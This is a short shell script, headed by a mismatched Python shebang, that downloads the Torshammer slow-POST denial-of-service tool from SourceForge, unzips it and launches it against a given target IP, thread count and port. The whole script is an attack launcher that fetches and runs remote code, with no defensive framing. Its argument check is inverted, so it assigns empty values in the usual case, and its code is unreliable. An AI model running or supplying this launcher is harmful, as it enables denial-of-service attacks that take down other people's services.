#!/usr/bin/python
echo "Usage: ./torshammer.sh <target> [<threads> <port>]";
echo "Default threads no=256; default port=80"

target=10.1.5.2
threads=""
port=""

if [ "$#" -ne 3 ];then
    target=$1
    threads=$2
    port=$3
fi


wget --content-disposition -c https://sourceforge.net/projects/torshammer/files/Torshammer/1.0/Torshammer%201.0.zip
unzip Torshammer\ 1.0.zip
cd Torshammer\ 1.0


./torshammer.py -t $target -r $threads -p $port
